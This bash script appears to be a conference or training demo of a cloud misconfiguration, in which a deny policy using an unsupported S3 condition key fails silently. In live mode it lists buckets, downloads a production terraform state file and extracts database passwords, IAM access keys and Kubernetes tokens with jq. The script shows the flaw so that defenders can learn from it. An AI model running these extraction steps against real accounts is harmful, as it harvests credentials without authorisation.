#!/bin/bash
set -euo pipefail

# Story 1: Broken Deny Policy — Attack Demo
# Shows how an unsupported condition key makes a Deny policy silently fail,
# giving an "admin with guardrails" full S3 access including terraform state.

source "$(dirname "$0")/demo_runner.sh"

PROFILE="default"
TF_DIR="<YOUR_PATH>"

set_prompt "restricted-admin \$"

banner "Story 1: The Broken Guardrail"

# ── Step 1: Identity ──
step 1 "Who am I?"

if is_live; then
  type_cmd "aws sts get-caller-identity"
  aws sts get-caller-identity --profile "${PROFILE}" --region "${REGION}" --output json 2>&1 | python3 -c "
import json,sys
d=json.load(sys.stdin)
print(f'  Account:  {d[\"Account\"]}')
print(f'  User:     {d[\"Arn\"].split(\"/\")[-1]}')
"
  sleep "$OUTPUT_DELAY"
else
  show_cmd "aws sts get-caller-identity" "$(
    cat <<'SIMOUT'
  Account:  111111111111
  User:     demo-restricted-admin
SIMOUT
  )"
fi

narrate "Restricted admin. AdministratorAccess + deny policies."

# ── Step 2: Policies ──
step 2 "What policies are attached?"

if is_live; then
  USERNAME=$(aws sts get-caller-identity --profile "${PROFILE}" --region "${REGION}" --query 'Arn' --output text 2>/dev/null | rev | cut -d'/' -f1 | rev || echo "restricted-admin")
  type_cmd "aws iam list-attached-user-policies"
  aws iam list-attached-user-policies --user-name "${USERNAME}" --profile "${PROFILE}" --region "${REGION}" --output json 2>&1 | python3 -c "
import json,sys
d=json.load(sys.stdin)
for i,p in enumerate(d['AttachedPolicies'],1):
    print(f'  {i}. {p[\"PolicyName\"]}')
"
  POLICY_COUNT=$(aws iam list-attached-user-policies --user-name "${USERNAME}" --profile "${PROFILE}" --region "${REGION}" --query 'length(AttachedPolicies)' --output text 2>/dev/null || echo "?")
  DENY_COUNT=$((POLICY_COUNT - 1))
  sleep "$OUTPUT_DELAY"
else
  show_cmd "aws iam list-attached-user-policies" "$(
    cat <<'SIMOUT'
  1. AdministratorAccess
  2. deny-s3-by-tag
  3. deny-iam-changes
  4. deny-ec2-terminate
  5. deny-cloudtrail-stop
  6. deny-guardduty-disable
SIMOUT
  )"
  POLICY_COUNT=6
  DENY_COUNT=5
fi

alert "${POLICY_COUNT} policies: Admin + ${DENY_COUNT} deny"

# ── Step 2b: Tags ──
step 2b "What are our tags?"

if is_live; then
  type_cmd "aws iam list-user-tags"
  aws iam list-user-tags --user-name "${USERNAME}" --profile "${PROFILE}" --region "${REGION}" --output json 2>&1 | python3 -c "
import json,sys
d=json.load(sys.stdin)
for t in d.get('Tags', []):
    print(f'  {t[\"Key\"]}: {t[\"Value\"]}')
"
  sleep "$OUTPUT_DELAY"
else
  show_cmd "aws iam list-user-tags" "$(
    cat <<'SIMOUT'
  ResourceOwner: demo-owner
  Story: 1
  Demo: true
  Project: cloud-therapy
SIMOUT
  )"
fi

info "Tagged as ResourceOwner: demo-owner"
narrate "Remember that tag..."

# ── Step 3: The broken deny policy ──
step 3 "The S3 deny policy"

if is_live; then
  POLICY_ARN=$(aws iam list-attached-user-policies --user-name "${USERNAME}" --profile "${PROFILE}" --region "${REGION}" --query "AttachedPolicies[?PolicyName=='deny-s3-by-tag'].PolicyArn" --output text 2>/dev/null || echo "")
  if [[ -n "${POLICY_ARN}" ]]; then
    POLICY_VERSION=$(aws iam get-policy --policy-arn "${POLICY_ARN}" --profile "${PROFILE}" --region "${REGION}" --query 'Policy.DefaultVersionId' --output text 2>/dev/null || echo "v1")
    type_cmd "aws iam get-policy-version"
    aws iam get-policy-version --policy-arn "${POLICY_ARN}" --version-id "${POLICY_VERSION}" --query 'PolicyVersion.Document' --profile "${PROFILE}" --region "${REGION}" --output json 2>&1 | python3 -c "
import json, sys
d = json.load(sys.stdin)
s = d['Statement'][0]
print(f'  Effect:    {s[\"Effect\"]}')
print(f'  Action:    {s[\"Action\"]}')
print(f'  Resource:  {s[\"Resource\"]}')
c = s.get('Condition',{})
for ck,cv in c.items():
    for k,v in cv.items():
        print(f'  Condition: {k} = \"{v}\"')
" 2>/dev/null || true
    sleep "$OUTPUT_DELAY"
  fi
else
  show_cmd "aws iam get-policy-version" "$(
    cat <<'SIMOUT'
  Effect:    Deny
  Action:    ['s3:*']
  Resource:  *
  Condition: aws:ResourceTag/ResourceOwner = "demo-owner"
SIMOUT
  )"
fi

echo ""
alert "aws:ResourceTag -- UNSUPPORTED for S3"
narrate "We ARE tagged ResourceOwner: demo-owner"
narrate "But S3 ignores aws:ResourceTag entirely."
alert "This policy does NOTHING."
sleep "$OUTPUT_DELAY"

# ── Step 4: Prove it — list S3 buckets ──
step 4 "Does the deny actually work?"

if is_live; then
  type_cmd "aws s3 ls"
  aws s3 ls --profile "${PROFILE}" --region "${REGION}" 2>&1
  sleep "$OUTPUT_DELAY"
  BUCKETS=$(aws s3 ls --profile "${PROFILE}" --region "${REGION}" --no-cli-pager 2>&1)
else
  BUCKETS="2026-03-15 demo-tfstate-a1b2c3d4
2026-03-15 demo-logs-111111111111
2026-03-15 demo-artifacts-111111111111"
  show_cmd "aws s3 ls" "$BUCKETS"
fi

alert "S3 access should be DENIED!"
alert "But it's wide open -- deny policy is a no-op"
sleep "$OUTPUT_DELAY"

# ── Step 5: Find and list tfstate bucket ──
step 5 "Inside the tfstate bucket"

BUCKET_NAME=""
if is_live; then
  BUCKET_NAME=$(terraform -chdir="${TF_DIR}" output -raw demo_bucket_name 2>/dev/null || echo "")
  if [[ -z "${BUCKET_NAME}" ]]; then
    BUCKET_NAME=$(echo "${BUCKETS}" | grep -o 'demo-tfstate-[a-f0-9]*' | head -1 || echo "")
  fi
  if [[ -z "${BUCKET_NAME}" ]]; then
    alert "Could not find demo bucket"
    exit 0
  fi
  type_cmd "aws s3 ls s3://${BUCKET_NAME}/ --recursive"
  aws s3 ls "s3://${BUCKET_NAME}/" --recursive --human-readable --profile "${PROFILE}" --region "${REGION}" 2>&1
  sleep "$OUTPUT_DELAY"
else
  BUCKET_NAME="demo-tfstate-a1b2c3d4"
  show_cmd "aws s3 ls s3://${BUCKET_NAME}/" "$(
    cat <<'SIMOUT'
  180 KiB  dev/terraform.tfstate
  255 KiB  staging/terraform.tfstate
  320 KiB  production/terraform.tfstate
SIMOUT
  )"
fi

alert "3 terraform state files found"
narrate "tfstate stores ALL secrets in plaintext."
sleep "$OUTPUT_DELAY"

# ── Step 6: Extract secrets ──
step 6 "Extract secrets from production tfstate"

if is_live; then
  TFSTATE_TMP=$(mktemp)
  trap "rm -f '${TFSTATE_TMP}'" EXIT
  type_cmd "aws s3 cp s3://${BUCKET_NAME}/production/terraform.tfstate -"
  aws s3 cp "s3://${BUCKET_NAME}/production/terraform.tfstate" "${TFSTATE_TMP}" \
    --profile "${PROFILE}" --region "${REGION}" --no-cli-pager --quiet
  echo "  download: complete"
  sleep "$OUTPUT_DELAY"

  if command -v jq &>/dev/null; then
    hr
    alert "RDS Credentials:"
    jq -r '.resources[] | select(.type == "aws_db_instance") | .instances[0].attributes | "  \(.endpoint)\n  \(.username):\(.password)"' "${TFSTATE_TMP}" 2>/dev/null || true
    echo ""
    alert "IAM Access Keys:"
    jq -r '.resources[] | select(.type == "aws_iam_access_key") | .instances[0].attributes | "  User: \(.user)\n  Key:  \(.id)\n  Secret: \(.secret[:20])..."' "${TFSTATE_TMP}" 2>/dev/null || true
    echo ""
    alert "K8s Token:"
    jq -r '.resources[] | select(.type == "kubernetes_service_account") | .instances[0].attributes | "  \(.metadata[0].name): \(.token[:40])..."' "${TFSTATE_TMP}" 2>/dev/null || true
  fi
else
  show_cmd "aws s3 cp ... | jq" ""
  hr
  alert "RDS Credentials:"
  kv "Endpoint" "prod-db.cxxx.us-east-2.rds.amazonaws.com"
  kv "Login" "admin:SuperSecret!Pr0d#2026"
  echo ""
  alert "IAM Access Keys:"
  kv "User" "deploy-bot"
  kv "Key" "AKIAXXXXXXXXXXXXXXXX"
  kv "Secret" "wJalrXUtnFEMI/K7MD..."
  echo ""
  alert "K8s Token:"
  kv "Name" "cluster-admin-sa"
  kv "Token" "eyJhbGciOiJSUzI1NiIs..."
  echo ""
  alert "API Gateway Key:"
  kv "Name" "prod-internal-api-key"
  kv "Value" "dGhpcyBpcyBhIHNlY3JldC..."
fi

sleep "$OUTPUT_DELAY"

# ── Summary ──
echo ""
hr
alert "4 credential types exposed. Zero alerts."
hr
echo "  1. RDS database credentials"
echo "  2. IAM access keys (long-lived)"
echo "  3. K8s service account token"
echo "  4. API gateway key"
echo ""
alert "One unsupported condition key = full S3 access"
info "The policy LOOKS right. It just doesn't DO anything."
info "No CloudTrail alert. No GuardDuty finding."
